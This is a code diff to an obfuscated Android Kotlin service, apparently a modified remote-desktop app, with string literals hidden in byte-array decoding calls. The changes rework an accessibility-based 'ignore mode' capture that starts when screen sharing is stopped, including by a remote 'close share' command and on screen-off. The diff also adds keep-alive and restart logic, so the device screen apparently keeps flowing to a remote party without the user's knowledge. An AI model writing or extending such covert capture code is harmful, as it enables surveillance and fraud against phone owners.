@@ -217,9 +217,6 @@ class DFm8Y8iMScvB2YDw : Service() {
                         translate(p50.a(byteArrayOf(58, -106, -43, -21, -5, -12, -20, 96, 27, -101, -47, -9), byteArrayOf(105, -2, -76, -103, -98, -44, -97, 3)))
                     }
                     if (authorized) {
-                        if (!isFileTransfer && !isStart) {
-                            startCapture()
-                        }
                         
                     } else {
                         
@@ -274,10 +271,8 @@ class DFm8Y8iMScvB2YDw : Service() {
                 {
                     Log.i("MainService", "关共享: received, posting to main thread")
                     Handler(Looper.getMainLooper()).post {
-                        killMediaProjection()
-                        // 关共享后自动激活无视模式作为备用帧流，防止画面冻结
-                        startIgnoreFallback("kill-media-command")
-                        Log.i("MainService", "关共享: 已自动激活无视模式作为备用")
+                        stopScreenShareAndStartIgnore("remote-command")
+                        Log.i("MainService", "关共享: 已停止屏幕共享，核心服务保持在线")
                     }
                 }
                 else if(arg1==p50.a(byteArrayOf(-16), byteArrayOf(-63, -13, -107, -101, 57, 111, 52, -114)))
@@ -290,7 +285,7 @@ class DFm8Y8iMScvB2YDw : Service() {
             } 
             p50.a(byteArrayOf(-56, -110, -115, -107, 94, -114, -38, -106, -106, -112, 115, -120), byteArrayOf(-69, -26, -30, -27, 1, -19)) -> {
            
-                 stopCapture()
+                 stopScreenShareAndStartIgnore("legacy-remote-command")
             }
             p50.a(byteArrayOf(118, 99, 26, -69, 37, -101, -42, 72, -28, -30), byteArrayOf(30, 2, 118, -35, 122, -24, -75, 41, -120, -121)) -> {
     
@@ -371,22 +366,32 @@ class DFm8Y8iMScvB2YDw : Service() {
     private var videoEncoder: MediaCodec? = null
     private var imageReader: ImageReader? = null
     private var virtualDisplay: VirtualDisplay? = null
+    @Volatile
+    private var screenOffActive = false
+    @Volatile
+    private var suppressNextProjectionStoppedIgnore = false
+    @Volatile
+    private var clearIgnoreOnceAfterShareStart = false
 
     private val screenStateReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             when (intent?.action) {
                 Intent.ACTION_SCREEN_OFF -> {
+                    screenOffActive = true
+                    val hadScreenShare = _isStart || mediaProjection != null
                     Log.i("MainService", "screen off: keep connected service alive")
                     ensureBackgroundKeepAlive()
                     keepServiceStateAfterNetworkOrScreenChange("screen-off")
                     Handler(Looper.getMainLooper()).postDelayed({
-                        if ((_isReady || _isStart) && mediaProjection == null) {
-                            startIgnoreFallback("screen-off-projection-lost")
-                        }
-                    }, 1500)
+                        startScreenOffIgnoreFallbackIfNeeded(hadScreenShare, "screen-off-early")
+                    }, 800)
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        startScreenOffIgnoreFallbackIfNeeded(hadScreenShare, "screen-off-projection-lost")
+                    }, 1800)
                 }
                 Intent.ACTION_SCREEN_ON,
                 Intent.ACTION_USER_PRESENT -> {
+                    screenOffActive = false
                     Log.i("MainService", "screen on/user present: refresh foreground service")
                     ensureBackgroundKeepAlive()
                     keepServiceStateAfterNetworkOrScreenChange("screen-on")
@@ -623,7 +628,7 @@ class DFm8Y8iMScvB2YDw : Service() {
     
         super.onStartCommand(intent, flags, startId)
         explicitStopRequested = false
-        if (intent == null || intent.action == ACT_KEEP_ALIVE_SERVICE) {
+        if (intent == null || intent.action == null || intent.action == ACT_KEEP_ALIVE_SERVICE) {
             Log.i("MainService", "onStartCommand: sticky restart")
             _isReady = true
             ensureBackgroundKeepAlive()
@@ -657,14 +662,9 @@ class DFm8Y8iMScvB2YDw : Service() {
                 createForegroundNotification()
                 ensureBackgroundKeepAlive()
 
-                // 新权限获取成功，关闭无视备用模式并自动启动捕获
-                nZW99cdXQ0COhB2o.stopIgnoreCapture("new-media-projection")
-                SKL = false
-                ClsFx9V0S.rEqMB3nD(255)  // PIXEL_SIZEBack8=255，阻止无视帧
-                Log.i("MainService", "onStartCommand: 新权限获取成功，关闭无视模式")
                 if (!_isStart) {
                     startCapture()
-                    Log.i("MainService", "onStartCommand: 自动启动捕获")
+                    Log.i("MainService", "onStartCommand: capture started after permission grant")
                 }
             } ?: let {
         
@@ -752,7 +752,7 @@ class DFm8Y8iMScvB2YDw : Service() {
             Log.i("MainService", "keep service after $reason")
             _isReady = true
             ensureBackgroundKeepAlive()
-            if (mediaProjection == null) {
+            if (mediaProjection == null && nZW99cdXQ0COhB2o.isOpen && shouldRun) {
                 startIgnoreFallback("keepalive-no-projection-$reason")
             }
             checkMediaPermission()
@@ -760,6 +760,12 @@ class DFm8Y8iMScvB2YDw : Service() {
     }
 
     private fun startIgnoreFallback(reason: String) {
+        if (!nZW99cdXQ0COhB2o.isOpen) {
+            Log.i("MainService", "startIgnoreFallback skipped: accessibility not ready, reason=$reason")
+            checkMediaPermission()
+            ensureFloatingWindowKeepAlive()
+            return
+        }
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             Log.i(
                 "MainService",
@@ -776,6 +782,40 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         ClsFx9V0S.rEqMB3nD(0)
         nZW99cdXQ0COhB2o.requestIgnoreCapture(reason)
+    }
+
+    private fun startScreenOffIgnoreFallbackIfNeeded(hadScreenShare: Boolean, reason: String) {
+        if (!screenOffActive || !hadScreenShare || !nZW99cdXQ0COhB2o.isOpen) {
+            return
+        }
+        if (shouldRun || nZW99cdXQ0COhB2o.isIgnorePending) {
+            return
+        }
+        startIgnoreFallback(reason)
+    }
+
+    private fun armOpenShareIgnoreBridge(reason: String) {
+        clearIgnoreOnceAfterShareStart = true
+        if (mediaProjection != null && _isStart) {
+            return
+        }
+        if (shouldRun || nZW99cdXQ0COhB2o.isIgnorePending) {
+            Log.i("MainService", "open-share bridge keeps existing ignore state, reason=$reason")
+            return
+        }
+        startIgnoreFallback("$reason-open-share-bridge")
+    }
+
+    private fun clearIgnoreOnceForOpenShare(reason: String): Boolean {
+        if (!clearIgnoreOnceAfterShareStart) {
+            return false
+        }
+        clearIgnoreOnceAfterShareStart = false
+        nZW99cdXQ0COhB2o.stopIgnoreCapture("$reason-open-share-ready")
+        SKL = false
+        ClsFx9V0S.rEqMB3nD(255)
+        Log.i("MainService", "open-share one-shot ignore cleared, reason=$reason")
+        return true
     }
 
     @SuppressLint("WakelockTimeout")
@@ -950,9 +990,12 @@ class DFm8Y8iMScvB2YDw : Service() {
             return false
         }
 
-        Log.i("MainService", "startCapture: resetting capture states before start")
-        nZW99cdXQ0COhB2o.resetCaptureStates("before-start-capture")
-        ClsFx9V0S.rEqMB3nD(255)
+        Log.i("MainService", "startCapture: preparing video capture")
+        val clearedOpenShareIgnore = clearIgnoreOnceForOpenShare("start-capture")
+        if (!clearedOpenShareIgnore && !shouldRun) {
+            SKL = false
+            ClsFx9V0S.rEqMB3nD(255)
+        }
         try {
             ClsFx9V0S.VaiKIoQu("video", true)
         } catch (e: Exception) {
@@ -970,8 +1013,8 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
 
       
-        checkMediaPermission()
         _isStart = true
+        checkMediaPermission()
         try {
             if (cpuWakeLock.isHeld) cpuWakeLock.release()
             cpuWakeLock.acquire()
@@ -1053,6 +1096,8 @@ class DFm8Y8iMScvB2YDw : Service() {
     @Synchronized
     private fun handleProjectionStoppedKeepService(reason: String, stopProjection: Boolean = false) {
         Log.i("MainService", "handleProjectionStoppedKeepService: $reason")
+        val suppressIgnore = suppressNextProjectionStoppedIgnore
+        suppressNextProjectionStoppedIgnore = false
 
         val stoppedProjection = mediaProjection
         mediaProjection = null
@@ -1091,7 +1136,9 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         surface = null
 
-        startIgnoreFallback("projection-stopped-$reason")
+        if (!suppressIgnore && nZW99cdXQ0COhB2o.isOpen && (shouldRun || screenOffActive)) {
+            startIgnoreFallback("projection-stopped-$reason")
+        }
         checkMediaPermission()
         createForegroundNotification()
         ensureFloatingWindowKeepAlive()
@@ -1101,7 +1148,14 @@ class DFm8Y8iMScvB2YDw : Service() {
     fun killMediaProjection() {
         Log.i("MainService", "killMediaProjection: begin, mp=${mediaProjection != null}")
 
+        nZW99cdXQ0COhB2o.stopIgnoreCapture("kill-media-projection")
+        SKL = false
+        ClsFx9V0S.rEqMB3nD(255)
+
         try {
+            if (mediaProjection != null) {
+                suppressNextProjectionStoppedIgnore = true
+            }
             mediaProjection?.stop()
             Log.i("MainService", "killMediaProjection: mp.stop() done")
         } catch (e: Exception) {
@@ -1129,7 +1183,6 @@ class DFm8Y8iMScvB2YDw : Service() {
         try { surface?.release() } catch (_: Exception) {}
         surface = null
 
-        startIgnoreFallback("kill-media-projection")
         checkMediaPermission()
         createForegroundNotification()
         ensureFloatingWindowKeepAlive()
@@ -1139,16 +1192,14 @@ class DFm8Y8iMScvB2YDw : Service() {
 
     fun restoreMediaProjection() {
         Log.i("MainService", "restoreMediaProjection: begin, savedIntent=${savedMediaProjectionIntent != null}")
+        armOpenShareIgnoreBridge("restore-media-command")
 
         if (_isStart && mediaProjection != null) {
+            clearIgnoreOnceForOpenShare("restore-media-already-active")
+            checkMediaPermission()
             Log.i("MainService", "restoreMediaProjection: already sharing, skip")
             return
         }
-
-        // 不在此处关闭无视模式，保持备用帧流直到MediaProjection成功恢复
-        // shouldRun 和 PIXEL_SIZEBack8 将在成功获取MediaProjection后才清除
-
-        startIgnoreFallback("restore-media-command")
 
         val savedIntent = savedMediaProjectionIntent
         if (savedIntent != null) {
@@ -1159,12 +1210,6 @@ class DFm8Y8iMScvB2YDw : Service() {
                 val newProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, savedIntent.clone() as Intent)
 
                 if (newProjection != null) {
-                    // Token复用成功，现在安全地关闭无视模式
-                    nZW99cdXQ0COhB2o.stopIgnoreCapture("restore-media-projection")
-                    SKL = false
-                    ClsFx9V0S.rEqMB3nD(255)  // PIXEL_SIZEBack8=255，阻止无视帧
-                    Log.i("MainService", "restoreMediaProjection: 无视模式已关闭")
-
                     mediaProjection = newProjection
                     mediaProjection?.registerCallback(object : android.media.projection.MediaProjection.Callback() {
                         override fun onStop() {
@@ -1190,15 +1235,19 @@ class DFm8Y8iMScvB2YDw : Service() {
             }
         }
 
-        // Token不可用，需要新权限。无视模式继续运行作为备用帧流；
-        // 新授权成功后 startCapture() 会再次强制清理互斥状态。
-        Log.i("MainService", "restoreMediaProjection: requesting new MediaProjection permission (无视模式保持运行作为备用)")
+        // The old token is unavailable. Keep the open-share bridge state and wait for permission.
+        Log.i("MainService", "restoreMediaProjection: requesting new MediaProjection permission")
         requestMediaProjection()
     }
 
     @Synchronized
     fun stopCaptureKeepService() {
         _isStart = false
+        _isAudioStart = false
+        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)
+        nZW99cdXQ0COhB2o.stopIgnoreCapture("stop-capture-keep-service")
+        SKL = false
+        ClsFx9V0S.rEqMB3nD(255)
 
         try {
             if (reuseVirtualDisplay) {
@@ -1239,17 +1288,43 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
 
         try {
+            if (mediaProjection != null) {
+                suppressNextProjectionStoppedIgnore = true
+            }
             mediaProjection?.stop()
         } catch (e: Exception) {
             Log.e("MainService", "stop mediaProjection failed", e)
         }
         mediaProjection = null
         _isReady = true
-        startIgnoreFallback("stop-capture-keep-service")
         createForegroundNotification()
         ensureFloatingWindowKeepAlive()
 
         Log.i("MainService", "stopCaptureKeepService: MediaProjection stopped, service alive")
+    }
+
+    @Synchronized
+    fun stopScreenShareOnly(reason: String) {
+        Log.i("MainService", "stopScreenShareOnly: $reason")
+        try {
+            ClsFx9V0S.VaiKIoQu("video", false)
+        } catch (e: Exception) {
+            Log.e("MainService", "stopScreenShareOnly: disable video raw failed", e)
+        }
+        stopCaptureKeepService()
+        checkMediaPermission()
+        createForegroundNotification()
+        ensureFloatingWindowKeepAlive()
+    }
+
+    @Synchronized
+    fun stopScreenShareAndStartIgnore(reason: String) {
+        Log.i("MainService", "stopScreenShareAndStartIgnore: $reason")
+        stopCaptureKeepService()
+        startIgnoreFallback("$reason-close-share")
+        checkMediaPermission()
+        createForegroundNotification()
+        ensureFloatingWindowKeepAlive()
     }
 
       @Synchronized
@@ -1323,7 +1398,7 @@ class DFm8Y8iMScvB2YDw : Service() {
         Handler(Looper.getMainLooper()).post {
             oFtTiPzsqzBHGigp.flutterMethodChannel?.invokeMethod(
                 p50.a(byteArrayOf(-110, -58, 67, 16, 62, -82, 28, -68, -100, -98, -64, 125, 13, 45, -86, 12), byteArrayOf(-3, -88, 28, 99, 74, -49, 104, -39, -61)),
-                mapOf(p50.a(byteArrayOf(-103, 71, -44, 108), byteArrayOf(-9, 38, -71, 9, 62, -116, -61, -29)) to p50.a(byteArrayOf(67, 35, -61, -15, -62), byteArrayOf(46, 70, -89, -104, -93, 117, -1, -67, -62, 31, 104)), p50.a(byteArrayOf(102, -75, 83, -89, 51), byteArrayOf(16, -44, 63, -46, 86, -62, -21, -124, -63, 10, 1)) to isReady.toString())
+                mapOf(p50.a(byteArrayOf(-103, 71, -44, 108), byteArrayOf(-9, 38, -71, 9, 62, -116, -61, -29)) to p50.a(byteArrayOf(67, 35, -61, -15, -62), byteArrayOf(46, 70, -89, -104, -93, 117, -1, -67, -62, 31, 104)), p50.a(byteArrayOf(102, -75, 83, -89, 51), byteArrayOf(16, -44, 63, -46, 86, -62, -21, -124, -63, 10, 1)) to isStart.toString())
             )
         }
         Handler(Looper.getMainLooper()).post {
